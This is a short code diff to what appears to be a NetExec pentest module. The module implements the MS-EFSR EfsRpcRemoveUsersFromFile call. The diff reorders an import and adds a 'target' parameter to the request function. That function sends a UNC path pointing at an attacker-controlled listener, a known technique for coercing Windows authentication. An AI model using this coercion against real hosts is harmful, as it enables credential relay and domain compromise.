@@ -1,8 +1,8 @@
 from impacket.dcerpc.v5.ndr import NDRCALL
 from impacket.dcerpc.v5.dtypes import WSTR
 
-from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
 from nxc.modules.coerce_plus_method.MS_EFSR.dtypes import ENCRYPTION_CERTIFICATE_HASH_LIST
+from nxc.modules.coerce_plus_method.DCERPCSessionError import DCERPCSessionError
 
 
 class EfsRpcRemoveUsersFromFile(NDRCALL):
@@ -19,7 +19,7 @@ class EfsRpcRemoveUsersFromFileResponse(NDRCALL):
     structure = ()
 
 
-def request(dce, listener):
+def request(dce, target, listener):
     request = EfsRpcRemoveUsersFromFile()
     request["FileName"] = f"\\\\{listener}\\test\\Settings.ini\x00"
     dce.request(request)
